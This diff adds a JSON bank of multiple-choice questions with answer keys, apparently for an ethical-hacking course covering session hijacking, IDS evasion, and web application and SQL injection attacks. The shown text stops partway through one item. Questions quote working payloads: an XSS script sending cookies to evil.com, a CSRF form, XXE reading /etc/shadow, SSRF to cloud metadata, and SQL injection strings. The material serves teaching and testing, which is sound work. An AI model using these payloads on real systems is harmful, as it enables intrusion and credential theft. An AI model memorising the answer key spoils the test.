@@ -1,0 +1,1404 @@
+{
+  "questions": [
+    {
+      "id": 101,
+      "moduleId": 11,
+      "question": "What is the primary goal of session hijacking?",
+      "options": [
+        "To steal a user's password by brute force",
+        "To take over an active session by stealing or predicting a valid session token",
+        "To perform a denial-of-service attack on the web server",
+        "To inject malware into the server's file system"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Session hijacking aims to take over an established session between a user and a server by stealing, predicting, or manipulating a valid session token. This allows the attacker to impersonate the legitimate user without needing their credentials directly.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 102,
+      "moduleId": 11,
+      "question": "Which of the following best describes a session fixation attack?",
+      "options": [
+        "The attacker sniffs network traffic to capture session cookies",
+        "The attacker forces a known session ID onto a victim before they authenticate",
+        "The attacker uses brute force to guess the session token",
+        "The attacker modifies HTTP response headers to redirect sessions"
+      ],
+      "correctAnswer": 1,
+      "explanation": "In a session fixation attack, the attacker sets a predetermined session ID for the victim. Once the victim authenticates using that fixed session ID, the attacker can use the same ID to access the authenticated session. This differs from session hijacking where the attacker steals an existing session.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 103,
+      "moduleId": 11,
+      "question": "An attacker is performing TCP session hijacking. They have sniffed traffic between a client (192.168.1.10) and a server (10.0.0.5). To inject packets into the session, what must the attacker accurately predict?",
+      "options": [
+        "The MAC address of the default gateway",
+        "The TCP sequence numbers being used in the session",
+        "The SSL/TLS certificate serial number",
+        "The DNS TTL values for the server's domain"
+      ],
+      "correctAnswer": 1,
+      "explanation": "TCP session hijacking requires the attacker to predict or know the correct TCP sequence numbers. TCP uses sequence numbers to ensure packets are received in order and to detect duplicates. If the attacker injects packets with incorrect sequence numbers, they will be dropped by the receiver.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 104,
+      "moduleId": 11,
+      "question": "A penetration tester discovers that a web application generates session tokens using the pattern: username + current timestamp (e.g., 'admin1689456000'). What is the most critical vulnerability here?",
+      "options": [
+        "The session token is too long and may cause buffer overflows",
+        "The session token is predictable, making session prediction attacks trivial",
+        "The session token uses HTTP instead of HTTPS",
+        "The session token does not expire after logout"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Session tokens constructed from predictable values like usernames and timestamps are vulnerable to session prediction attacks. An attacker who knows the token generation algorithm can calculate valid session tokens for other users. Secure session tokens should be generated using cryptographically secure random number generators.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 105,
+      "moduleId": 11,
+      "question": "An attacker injects the following script into a vulnerable forum post: <script>document.location='http://evil.com/steal.php?c='+document.cookie;</script>. What type of attack is being performed?",
+      "options": [
+        "SQL injection to extract session data from the database",
+        "Cross-Site Request Forgery (CSRF) to hijack the session",
+        "Cross-Site Scripting (XSS) to steal session cookies",
+        "Session fixation through HTTP header injection"
+      ],
+      "correctAnswer": 2,
+      "explanation": "This is a stored XSS (Cross-Site Scripting) attack designed to steal session cookies. The malicious script reads the victim's cookies via document.cookie and sends them to the attacker's server. The HttpOnly flag on cookies is the primary defense against this type of session theft.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 106,
+      "moduleId": 11,
+      "question": "Which HTTP cookie attribute prevents JavaScript from accessing the session cookie, mitigating XSS-based session theft?",
+      "options": [
+        "Secure",
+        "SameSite",
+        "HttpOnly",
+        "Path"
+      ],
+      "correctAnswer": 2,
+      "explanation": "The HttpOnly flag instructs the browser to prevent client-side scripts (like JavaScript) from accessing the cookie. This is a critical defense against XSS-based session hijacking because even if an attacker injects malicious JavaScript, they cannot read cookies marked with HttpOnly.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 107,
+      "moduleId": 11,
+      "question": "During a penetration test, you successfully perform a man-in-the-browser (MitB) attack using a Trojan. How does this attack differ from a traditional man-in-the-middle attack?",
+      "options": [
+        "MitB attacks only work on mobile browsers, not desktop browsers",
+        "MitB operates inside the victim's browser process, intercepting and modifying transactions in real-time before encryption",
+        "MitB requires physical access to the victim's computer",
+        "MitB attacks are limited to unencrypted HTTP traffic only"
+      ],
+      "correctAnswer": 1,
+      "explanation": "A Man-in-the-Browser (MitB) attack uses a Trojan that operates within the browser process itself, allowing it to intercept and modify web page content and transactions before they are encrypted by SSL/TLS. Unlike traditional MitM attacks, MitB can defeat HTTPS because it operates inside the browser at the application layer.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 108,
+      "moduleId": 11,
+      "question": "A security analyst notices that a web application regenerates session IDs after successful login but fails to invalidate the old session ID. What attack does this leave the application vulnerable to?",
+      "options": [
+        "Cross-Site Request Forgery (CSRF)",
+        "Session donation attack",
+        "Session fixation attack",
+        "Clickjacking"
+      ],
+      "correctAnswer": 2,
+      "explanation": "If the old session ID remains valid after a new one is issued at login, the application is still vulnerable to session fixation. An attacker who fixed the original session ID can continue using it even after the victim logs in, because the server never invalidated the pre-authentication session. Proper mitigation requires both regenerating and invalidating the old session ID.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 109,
+      "moduleId": 11,
+      "question": "An attacker uses the Burp Suite tool to intercept and replay a session token captured from an authenticated user. The application uses short-lived tokens but does not implement any additional session validation. Which countermeasure would be MOST effective?",
+      "options": [
+        "Increasing the length of the session token to 256 characters",
+        "Binding the session to additional client attributes such as IP address and User-Agent string",
+        "Switching from cookie-based to URL-based session tracking",
+        "Implementing HTTP Basic authentication instead of session tokens"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Binding sessions to client-specific attributes like IP address, User-Agent, and device fingerprint makes stolen session tokens harder to reuse from a different machine. While not foolproof, this adds a layer of defense-in-depth. URL-based session tracking is actually less secure as tokens can leak through referrer headers and browser history.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 110,
+      "moduleId": 11,
+      "question": "Which of the following tools is commonly used to perform session hijacking by sniffing network traffic and extracting session cookies from unencrypted HTTP traffic?",
+      "options": [
+        "Nmap",
+        "Wireshark",
+        "Metasploit",
+        "Nikto"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Wireshark is a powerful network protocol analyzer that can capture and analyze network traffic, including extracting session cookies from unencrypted HTTP communications. An attacker can filter HTTP traffic and inspect cookie headers to obtain valid session tokens for hijacking. Tools like Ferret and Hamster were also historically used for this purpose.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 111,
+      "moduleId": 12,
+      "question": "What is the primary purpose of an Intrusion Detection System (IDS)?",
+      "options": [
+        "To block malicious traffic from entering the network",
+        "To monitor network traffic and alert on suspicious activity",
+        "To encrypt all traffic passing through the network",
+        "To perform automated vulnerability scanning"
+      ],
+      "correctAnswer": 1,
+      "explanation": "An IDS is designed to monitor network traffic or system activities and generate alerts when suspicious or malicious behavior is detected. Unlike an Intrusion Prevention System (IPS), a standard IDS does not actively block traffic; it only detects and alerts administrators about potential threats.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 112,
+      "moduleId": 12,
+      "question": "An attacker fragments malicious packets into very small pieces to evade an IDS. What evasion technique is this?",
+      "options": [
+        "Protocol-level misinterpretation",
+        "Fragmentation attack",
+        "Obfuscation attack",
+        "Denial-of-service attack"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Fragmentation attacks split malicious payloads across multiple small IP fragments. Many IDS systems struggle to reassemble fragmented packets correctly, especially when fragments overlap or arrive out of order. The attacker hopes the IDS will fail to detect the malicious pattern while the target host correctly reassembles the original payload.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 113,
+      "moduleId": 12,
+      "question": "Which type of IDS evasion involves sending packets with different TTL values so that some packets reach the IDS but expire before reaching the target?",
+      "options": [
+        "Session splicing",
+        "TTL-based insertion attack",
+        "Unicode evasion",
+        "Polymorphic shellcode"
+      ],
+      "correctAnswer": 1,
+      "explanation": "In a TTL-based insertion attack, the attacker sends extra packets with low TTL values that reach the IDS (which is positioned closer) but expire before reaching the target host. The IDS sees these extra packets and reassembles a different (benign) payload than what the target actually receives, causing the IDS to miss the attack.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 114,
+      "moduleId": 12,
+      "question": "A penetration tester needs to bypass a firewall that only allows outbound HTTP and HTTPS traffic. Which technique would be MOST effective for establishing a reverse shell?",
+      "options": [
+        "Sending SYN packets on random high ports",
+        "Tunneling the reverse shell over HTTP/HTTPS on port 443",
+        "Using ICMP echo requests to transfer data",
+        "Fragmenting the shell traffic into small UDP packets"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Tunneling malicious traffic over allowed protocols (HTTP/HTTPS on port 443) is one of the most effective firewall evasion techniques. Since the firewall permits outbound HTTPS traffic, encapsulating the reverse shell communication within HTTPS makes it appear as legitimate encrypted web traffic, effectively bypassing port-based firewall rules.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 115,
+      "moduleId": 12,
+      "question": "What is the key difference between a high-interaction honeypot and a low-interaction honeypot?",
+      "options": [
+        "High-interaction honeypots only simulate services, while low-interaction honeypots use real operating systems",
+        "High-interaction honeypots use real operating systems and services, providing a full environment for attackers to interact with",
+        "High-interaction honeypots are deployed in the cloud, while low-interaction honeypots are on-premises only",
+        "High-interaction honeypots can only detect known attacks, while low-interaction honeypots detect zero-day attacks"
+      ],
+      "correctAnswer": 1,
+      "explanation": "High-interaction honeypots provide real operating systems, applications, and services for attackers to interact with, allowing security teams to capture detailed attack methods and zero-day exploits. Low-interaction honeypots only emulate specific services or protocols, are easier to deploy, but provide limited information about attacker techniques.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 116,
+      "moduleId": 12,
+      "question": "An attacker uses the nmap command: nmap -f -T0 -D RND:10 192.168.1.100. What evasion techniques are being combined in this scan?",
+      "options": [
+        "Fragmentation, aggressive timing, and OS fingerprinting",
+        "Fragmentation, very slow timing (paranoid), and decoy scanning with 10 random IPs",
+        "Full connect scan, fast timing, and DNS resolution",
+        "FIN scanning, default timing, and 10 specific decoy addresses"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The -f flag enables IP fragmentation to evade IDS/firewall packet inspection. -T0 sets the timing to 'paranoid' (extremely slow, 5 minutes between probes) to avoid time-based detection. -D RND:10 generates 10 random decoy IP addresses to obscure the real scanning source. This combination makes the scan very difficult to detect and attribute.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 117,
+      "moduleId": 12,
+      "question": "During IDS evasion testing, an attacker encodes a web attack payload using URL encoding: %2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd. What is the decoded payload?",
+      "options": [
+        "/home/user/etc/passwd",
+        "/../../etc/passwd",
+        "//..etc..passwd",
+        "%2F%2E%2E%2Fetc/passwd"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The URL-encoded string decodes to /../../etc/passwd, which is a classic directory traversal attack attempting to access the Unix password file. URL encoding is a common IDS evasion technique because signature-based IDS may not decode URL-encoded characters before pattern matching, causing the attack to bypass detection rules.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 118,
+      "moduleId": 12,
+      "question": "A security architect needs to deploy a network-based IDS. Where should the IDS sensor be placed to monitor all incoming traffic from the internet?",
+      "options": [
+        "Between the internal network switches",
+        "On the DMZ segment behind the firewall",
+        "Connected to a SPAN/mirror port on the border router or just inside the firewall",
+        "On the same subnet as the database servers"
+      ],
+      "correctAnswer": 2,
+      "explanation": "Connecting the IDS sensor to a SPAN (Switched Port Analyzer) or mirror port on the border router or just inside the firewall allows it to see copies of all traffic entering and leaving the network. This positioning gives maximum visibility into incoming threats while the IDS operates passively without affecting network performance.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 119,
+      "moduleId": 12,
+      "question": "An advanced attacker uses polymorphic shellcode to evade signature-based IDS detection. How does polymorphic shellcode achieve evasion?",
+      "options": [
+        "It encrypts the entire network connection using custom SSL certificates",
+        "It changes its binary pattern on each execution while maintaining the same functionality, defeating static signatures",
+        "It splits the shellcode across multiple TCP sessions that are never reassembled",
+        "It uses legitimate system utilities to execute malicious commands"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Polymorphic shellcode uses self-modifying code techniques to change its binary representation each time it executes, while the underlying functionality remains the same. This defeats signature-based IDS because no two instances of the shellcode share the same byte pattern, making it impossible to create a static detection signature.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 120,
+      "moduleId": 12,
+      "question": "An organization deploys a honeynet consisting of multiple honeypots simulating an entire network segment. An attacker gains access but suspects they are in a honeypot environment. Which indicator would MOST reliably confirm their suspicion?",
+      "options": [
+        "The network has unusually fast response times",
+        "All systems have the latest security patches applied",
+        "There is no legitimate outbound traffic, no real user activity, and the systems have no real production data",
+        "The systems use Linux instead of Windows operating systems"
+      ],
+      "correctAnswer": 2,
+      "explanation": "The most reliable indicator of a honeypot/honeynet is the absence of legitimate activity. Real production networks have user logins, real data, varied outbound traffic, and normal usage patterns. A honeynet with no real users, no production data, and no genuine outbound traffic is a strong indicator of a decoy environment designed to attract and study attackers.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 121,
+      "moduleId": 13,
+      "question": "Which of the following is a common web server misconfiguration that attackers exploit?",
+      "options": [
+        "Enabling HTTPS with TLS 1.3",
+        "Leaving default credentials and sample applications installed",
+        "Implementing Content Security Policy headers",
+        "Disabling directory listing on the web server"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Leaving default credentials, sample applications, and unnecessary services enabled is one of the most common and dangerous web server misconfigurations. Attackers frequently check for default admin pages, sample scripts, and known default passwords. Proper hardening requires removing all defaults and unnecessary components before deployment.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 122,
+      "moduleId": 13,
+      "question": "What is a directory traversal (path traversal) attack on a web server?",
+      "options": [
+        "An attack that lists all files in the web server's document root",
+        "An attack that uses sequences like ../ to access files outside the web root directory",
+        "An attack that creates new directories on the web server",
+        "An attack that renames existing directories to disrupt web services"
+      ],
+      "correctAnswer": 1,
+      "explanation": "A directory traversal attack uses special character sequences such as ../ (dot-dot-slash) to navigate the file system and access files outside the intended web root directory. For example, requesting /../../../../etc/passwd could allow an attacker to read sensitive system files that should not be accessible through the web server.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 123,
+      "moduleId": 13,
+      "question": "An attacker sends the following HTTP request to a web server:\nGET /page.php?file=....//....//....//etc/passwd HTTP/1.1\nWhat technique is the attacker using and why?",
+      "options": [
+        "SQL injection using encoded slashes",
+        "Directory traversal with double-encoding to bypass basic ../ filtering",
+        "HTTP response splitting to inject headers",
+        "Server-Side Request Forgery (SSRF) targeting the local file system"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The attacker uses ....// instead of ../ to bypass simple input filters that strip ../ sequences. When the filter removes ../ from ....// it leaves behind ../, which still performs directory traversal. This is a common filter evasion technique used to circumvent basic security controls on file inclusion parameters.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 124,
+      "moduleId": 13,
+      "question": "During a web server assessment, you discover that the server returns detailed error messages including stack traces, database connection strings, and internal file paths. What is the security implication?",
+      "options": [
+        "The server has been already compromised by an attacker",
+        "Information disclosure through verbose error messages aids attackers in further exploitation",
+        "The web application has SQL injection vulnerabilities",
+        "The server's SSL certificate has expired"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Verbose error messages that reveal internal paths, technology stack details, database information, and stack traces constitute an information disclosure vulnerability. Attackers use this information to understand the server's architecture and craft targeted attacks. Production servers should display generic error messages and log detailed errors internally.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 125,
+      "moduleId": 13,
+      "question": "Which web server attack involves injecting malicious content into HTTP headers to manipulate how the response is processed by the client or intermediary cache?",
+      "options": [
+        "Cross-Site Scripting (XSS)",
+        "HTTP Response Splitting",
+        "SQL Injection",
+        "Clickjacking"
+      ],
+      "correctAnswer": 1,
+      "explanation": "HTTP Response Splitting occurs when an attacker injects CRLF (Carriage Return Line Feed) characters into HTTP response headers, effectively splitting one response into two. This can be used for cache poisoning, cross-site scripting, or redirecting users to malicious sites. The attack exploits applications that include user input in HTTP response headers without proper sanitization.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 126,
+      "moduleId": 13,
+      "question": "A penetration tester runs Nikto against a target web server and receives the following output:\n+ /admin/ - Directory indexing found\n+ /backup.sql - Database backup file found\n+ Server: Apache/2.4.49\nWhich finding presents the HIGHEST immediate risk?",
+      "options": [
+        "The Apache version disclosure in the Server header",
+        "The database backup file (backup.sql) accessible via the web",
+        "The directory indexing on the /admin/ directory",
+        "All findings present equal risk"
+      ],
+      "correctAnswer": 1,
+      "explanation": "A publicly accessible database backup file (backup.sql) presents the highest immediate risk because it likely contains sensitive data such as user credentials, personal information, and database schema details. While directory indexing and version disclosure are concerning, they primarily aid reconnaissance rather than providing direct access to sensitive data.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 127,
+      "moduleId": 13,
+      "question": "What is the purpose of the HTTP Strict-Transport-Security (HSTS) header in web server security?",
+      "options": [
+        "It prevents cross-site scripting attacks by restricting script sources",
+        "It forces browsers to communicate with the server only over HTTPS, preventing protocol downgrade attacks",
+        "It blocks SQL injection attempts by sanitizing input parameters",
+        "It limits the rate of incoming HTTP requests to prevent DoS attacks"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The HSTS header instructs web browsers to only connect to the server using HTTPS, even if the user types HTTP in the address bar. This prevents SSL stripping attacks and protocol downgrade attacks where an attacker intercepts the initial HTTP request before it gets redirected to HTTPS.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 128,
+      "moduleId": 13,
+      "question": "An attacker exploits a vulnerable web server running Apache 2.4.49 to perform a path traversal attack using the CVE-2021-41773 vulnerability. What was the root cause of this vulnerability?",
+      "options": [
+        "A buffer overflow in the Apache HTTP parsing module",
+        "Improper URL normalization that failed to decode percent-encoded path traversal sequences correctly",
+        "A default configuration that allowed remote code execution via CGI scripts",
+        "An unpatched SQL injection flaw in the mod_rewrite module"
+      ],
+      "correctAnswer": 1,
+      "explanation": "CVE-2021-41773 in Apache 2.4.49 was caused by a flaw in the path normalization process that failed to properly handle percent-encoded (URL-encoded) directory traversal sequences like %2e. This allowed attackers to bypass access controls and read files outside the document root, and with mod_cgi enabled, could even achieve remote code execution.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 129,
+      "moduleId": 13,
+      "question": "A web server is configured to handle virtual hosting for multiple domains. An attacker sends an HTTP request without a Host header or with a manipulated Host header. What attack could this facilitate?",
+      "options": [
+        "DNS zone transfer",
+        "Host header injection leading to web cache poisoning or password reset poisoning",
+        "ARP spoofing on the local network",
+        "LDAP injection against the directory service"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Host header injection attacks exploit web applications that trust the Host header without validation. Attackers can manipulate the Host header to poison web caches with malicious content, redirect password reset links to attacker-controlled domains, or exploit virtual hosting misconfigurations. Servers should validate and whitelist expected Host header values.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 130,
+      "moduleId": 13,
+      "question": "Which tool is specifically designed for web server vulnerability scanning and checks for dangerous files, outdated software, and server misconfigurations?",
+      "options": [
+        "Nmap",
+        "Nikto",
+        "John the Ripper",
+        "Aircrack-ng"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Nikto is an open-source web server scanner that performs comprehensive tests against web servers for multiple items including over 6700 potentially dangerous files, outdated server versions, and server configuration issues. It is specifically designed for web server vulnerability assessment and is widely used in penetration testing engagements.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 131,
+      "moduleId": 14,
+      "question": "According to the OWASP Top 10 (2021), which category is ranked as the number one web application security risk?",
+      "options": [
+        "Injection",
+        "Broken Access Control",
+        "Cryptographic Failures",
+        "Cross-Site Scripting"
+      ],
+      "correctAnswer": 1,
+      "explanation": "In the OWASP Top 10 2021 edition, Broken Access Control moved to the #1 position, replacing Injection which had held the top spot for years. Broken Access Control occurs when users can act outside their intended permissions, such as accessing other users' data, modifying access rights, or viewing unauthorized pages.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 132,
+      "moduleId": 14,
+      "question": "What is the fundamental difference between stored XSS and reflected XSS?",
+      "options": [
+        "Stored XSS uses JavaScript while reflected XSS uses HTML only",
+        "Stored XSS persists the malicious script on the server, while reflected XSS requires the victim to click a crafted link",
+        "Stored XSS only works on HTTPS sites, while reflected XSS works on HTTP sites",
+        "Stored XSS targets the server, while reflected XSS targets the database"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Stored (persistent) XSS saves the malicious script on the server (e.g., in a database, forum post, or comment), and it executes every time a user views the affected page. Reflected (non-persistent) XSS requires the attacker to trick the victim into clicking a specially crafted URL that contains the malicious script, which is then reflected back by the server.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 133,
+      "moduleId": 14,
+      "question": "An attacker crafts the following HTML on a malicious website:\n<form action='https://bank.com/transfer' method='POST'>\n<input type='hidden' name='to' value='attacker'>\n<input type='hidden' name='amount' value='10000'>\n</form>\n<script>document.forms[0].submit();</script>\nWhat type of attack is this?",
+      "options": [
+        "Cross-Site Scripting (XSS)",
+        "SQL Injection",
+        "Cross-Site Request Forgery (CSRF)",
+        "Server-Side Request Forgery (SSRF)"
+      ],
+      "correctAnswer": 2,
+      "explanation": "This is a Cross-Site Request Forgery (CSRF) attack. The attacker's page automatically submits a form to the victim's bank, and if the victim is already authenticated, the browser will include their session cookie with the request. The bank processes the transfer because the request appears legitimate. Anti-CSRF tokens and SameSite cookie attributes are the primary defenses.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 134,
+      "moduleId": 14,
+      "question": "A developer implements the following anti-CSRF protection: a random token is generated per session and included as a hidden field in all forms. What additional check must the server perform for this protection to be effective?",
+      "options": [
+        "Verify the token matches a value stored on the server for that session before processing the request",
+        "Check that the token is longer than 32 characters",
+        "Ensure the token is encrypted using AES-256",
+        "Validate that the token was generated within the last 60 seconds"
+      ],
+      "correctAnswer": 0,
+      "explanation": "For anti-CSRF tokens to be effective, the server must validate that the token submitted with each state-changing request matches the token stored server-side for that user's session. Without this server-side validation check, the token provides no protection even if it is present in the form. The token must be unique, unpredictable, and verified on every sensitive request.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 135,
+      "moduleId": 14,
+      "question": "What is Server-Side Request Forgery (SSRF)?",
+      "options": [
+        "An attack where the client is tricked into making unintended requests",
+        "An attack where the attacker makes the server send requests to unintended internal or external resources",
+        "An attack that forges server SSL certificates",
+        "An attack that modifies server-side session variables"
+      ],
+      "correctAnswer": 1,
+      "explanation": "SSRF is a vulnerability where an attacker can induce the server to make HTTP requests to arbitrary destinations, often targeting internal services, cloud metadata endpoints (e.g., 169.254.169.254), or other resources not directly accessible from the internet. SSRF gained significant attention after the 2019 Capital One breach and is now included in the OWASP Top 10.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 136,
+      "moduleId": 14,
+      "question": "During a web application penetration test, you discover that the application uses the following URL pattern to fetch user profile images: /fetch?url=http://cdn.example.com/images/user1.jpg. You change the URL to /fetch?url=http://169.254.169.254/latest/meta-data/. What are you testing for?",
+      "options": [
+        "Open redirect vulnerability",
+        "Server-Side Request Forgery (SSRF) targeting cloud instance metadata",
+        "Local File Inclusion (LFI)",
+        "XML External Entity (XXE) injection"
+      ],
+      "correctAnswer": 1,
+      "explanation": "This tests for SSRF by attempting to make the server fetch the cloud instance metadata endpoint (169.254.169.254), which is a common target in AWS, GCP, and Azure environments. If successful, the attacker can retrieve sensitive information such as IAM credentials, API keys, and infrastructure configuration from the cloud provider's metadata service.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 137,
+      "moduleId": 14,
+      "question": "An application allows users to upload profile pictures. The server only checks the file extension (.jpg, .png) to validate uploads. How could an attacker exploit this?",
+      "options": [
+        "Upload a file larger than the maximum allowed size",
+        "Upload a PHP web shell with a double extension like shell.php.jpg or modify the Content-Type header",
+        "Upload a JPEG file containing EXIF data",
+        "Upload an SVG file to perform clickjacking"
+      ],
+      "correctAnswer": 1,
+      "explanation": "If the server only validates file extensions, an attacker can upload a malicious web shell using techniques like double extensions (shell.php.jpg), null byte injection (shell.php%00.jpg), or by modifying the Content-Type header while keeping a .php extension. Proper file upload security requires validating content type, checking magic bytes, and storing files outside the web root.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 138,
+      "moduleId": 14,
+      "question": "A security analyst is testing for Insecure Direct Object References (IDOR). The application URL shows /api/user/1234/profile for the logged-in user. The analyst changes it to /api/user/1235/profile and can view another user's data. What category of OWASP Top 10 does this fall under?",
+      "options": [
+        "Injection",
+        "Broken Access Control",
+        "Security Misconfiguration",
+        "Identification and Authentication Failures"
+      ],
+      "correctAnswer": 1,
+      "explanation": "IDOR is a type of Broken Access Control vulnerability (OWASP Top 10 #1, 2021). The application fails to verify that the authenticated user is authorized to access the specific resource identified by the object reference (user ID 1235). Proper mitigation requires implementing server-side authorization checks on every request to verify the user's access rights to the requested resource.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 139,
+      "moduleId": 14,
+      "question": "An attacker discovers an XML endpoint and submits the following payload:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>\n<data>&xxe;</data>\nWhat attack is being performed and what is the potential impact?",
+      "options": [
+        "XSS injection to steal cookies from XML-based applications",
+        "XML External Entity (XXE) injection to read sensitive files from the server",
+        "XSLT injection to execute server-side commands",
+        "XPath injection to bypass authentication"
+      ],
+      "correctAnswer": 1,
+      "explanation": "This is an XML External Entity (XXE) injection attack. The malicious DOCTYPE declaration defines an external entity that references the server's /etc/shadow file. When the XML parser processes &xxe;, it replaces it with the contents of the shadow file. XXE can lead to file disclosure, SSRF, denial of service, and in some cases remote code execution. Mitigation includes disabling external entity processing in XML parsers.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 140,
+      "moduleId": 14,
+      "question": "A web application implements JWT (JSON Web Tokens) for authentication. An attacker modifies the JWT header from {\"alg\":\"RS256\"} to {\"alg\":\"none\"} and removes the signature. If the server processes this token, what vulnerability exists?",
+      "options": [
+        "The server is vulnerable to SQL injection through JWT claims",
+        "The server fails to validate the JWT algorithm, allowing signature bypass (JWT algorithm confusion)",
+        "The server has a Cross-Site Request Forgery vulnerability",
+        "The server is vulnerable to XML External Entity injection"
+      ],
+      "correctAnswer": 1,
+      "explanation": "This is a JWT algorithm confusion vulnerability where the server accepts tokens with the 'none' algorithm, effectively disabling signature verification. An attacker can forge arbitrary tokens with any claims (e.g., admin privileges) without a valid signature. Secure JWT implementations must enforce a whitelist of accepted algorithms and reject tokens with 'none' or unexpected algorithm values.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 141,
+      "moduleId": 15,
+      "question": "What type of SQL injection returns results directly in the application's response?",
+      "options": [
+        "Blind SQL injection",
+        "In-band SQL injection",
+        "Out-of-band SQL injection",
+        "Second-order SQL injection"
+      ],
+      "correctAnswer": 1,
+      "explanation": "In-band SQL injection (also called classic SQLi) occurs when the attacker uses the same communication channel to launch the attack and retrieve results. The two most common types are error-based (extracting data from database error messages) and UNION-based (combining results with legitimate queries). It is the most straightforward and common type of SQL injection.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 142,
+      "moduleId": 15,
+      "question": "An attacker enters the following in a login form's username field: ' OR '1'='1' --\nWhat is the attacker attempting to achieve?",
+      "options": [
+        "Creating a new user account in the database",
+        "Bypassing authentication by making the SQL query always return true",
+        "Performing a denial-of-service attack on the database",
+        "Encrypting the database with ransomware"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The payload ' OR '1'='1' -- is a classic authentication bypass attempt. The single quote closes the username string, OR '1'='1' adds a condition that is always true, and -- comments out the rest of the query (including the password check). This causes the query to return all users, often logging the attacker in as the first user in the database (typically the administrator).",
+      "difficulty": "easy"
+    },
+    {
+      "id": 143,
+      "moduleId": 15,
+      "question": "An attacker constructs the following SQL injection payload: ' UNION SELECT username, password FROM users --\nBefore this UNION-based attack can work, what must the attacker first determine?",
+      "options": [
+        "The database administrator's email address",
+        "The exact number of columns in the original SELECT query",
+        "The physical location of the database server",
+        "The web server's operating system version"
+      ],
+      "correctAnswer": 1,
+      "explanation": "UNION-based SQL injection requires that the injected SELECT statement has the same number of columns as the original query. Attackers typically determine this by using ORDER BY with incrementing numbers (ORDER BY 1, ORDER BY 2, etc.) until an error occurs, or by using UNION SELECT NULL,NULL,NULL with varying numbers of NULLs until a successful response is received.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 144,
+      "moduleId": 15,
+      "question": "During blind SQL injection testing, an attacker sends these two requests:\n1. /products?id=1 AND 1=1 (returns normal page)\n2. /products?id=1 AND 1=2 (returns different/empty page)\nWhat type of blind SQL injection is this?",
+      "options": [
+        "Time-based blind SQL injection",
+        "Error-based SQL injection",
+        "Boolean-based blind SQL injection",
+        "Out-of-band SQL injection"
+      ],
+      "correctAnswer": 2,
+      "explanation": "This is boolean-based blind SQL injection. The attacker infers information based on whether the application returns a different response for true (1=1) versus false (1=2) conditions. By systematically testing conditions about the database (e.g., substring comparisons of table names or data values), the attacker can extract data one bit at a time based on the true/false responses.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 145,
+      "moduleId": 15,
+      "question": "An attacker uses the following payload during blind SQL injection:\n/products?id=1; IF (SELECT LEN(password) FROM users WHERE username='admin')>8 WAITFOR DELAY '0:0:5'--\nWhat technique is being used?",
+      "options": [
+        "UNION-based extraction",
+        "Error-based enumeration",
+        "Time-based blind SQL injection",
+        "Stacked query with output redirection"
+      ],
+      "correctAnswer": 2,
+      "explanation": "This is time-based blind SQL injection using Microsoft SQL Server's WAITFOR DELAY function. If the admin's password length is greater than 8 characters, the server waits 5 seconds before responding. The attacker measures response times to determine true/false conditions. Similar functions exist in other databases: SLEEP() in MySQL and pg_sleep() in PostgreSQL.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 146,
+      "moduleId": 15,
+      "question": "What is the MOST effective defense against SQL injection attacks?",
+      "options": [
+        "Implementing a Web Application Firewall (WAF)",
+        "Using parameterized queries (prepared statements) with bound parameters",
+        "Filtering single quotes from user input",
+        "Encoding all output displayed to users"
